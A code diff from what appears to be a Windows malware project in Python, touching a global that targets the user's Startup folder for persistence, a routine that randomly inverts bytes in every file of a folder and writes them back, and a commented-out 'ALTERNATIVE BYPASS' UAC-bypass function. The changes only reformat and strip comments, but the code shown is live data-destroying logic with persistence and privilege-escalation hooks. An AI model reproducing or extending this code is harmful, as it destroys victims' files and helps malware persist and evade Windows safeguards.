@@ -18,9 +18,7 @@ except ImportError:
 
 # Globals
 CC = lambda: os.system('cls' if os.name == 'nt' else 'clear')
-startupDir = (
-  r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
-  % os.getlogin())
+startupDir = (r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % os.getlogin())
 
 
 # Classes
@@ -383,14 +381,12 @@ class functions():
       path_to_file = os.path.join(source_folder, file)
       with open(path_to_file, "rb") as binary_file:
         data = binary_file.read()
-        # Iterate over the bits in the file content
+        
         for bit_index in range(len(data)):
-          # Randomly decide whether to switch the bit
           switch = random.choice([True, False])
           if switch:
-            # Replace the bit at the current index with its inverse
             data = data[:bit_index] + bytes([data[bit_index] ^ 0xFF]) + data[bit_index + 1:]
-      # Write the corrupted content back to the file
+            
       with open(path_to_file, "wb") as binary_file:
         binary_file.write(data)
 
@@ -444,7 +440,7 @@ class functions():
       else:
         pass
 
-  # ALTERNATIVE BYPASS (TEST zFIRST)
+  # ALTERNATIVE BYPASS (TEST FIRST)
   #def UACbypass():
   #try:
   # Get the current value of the UAC
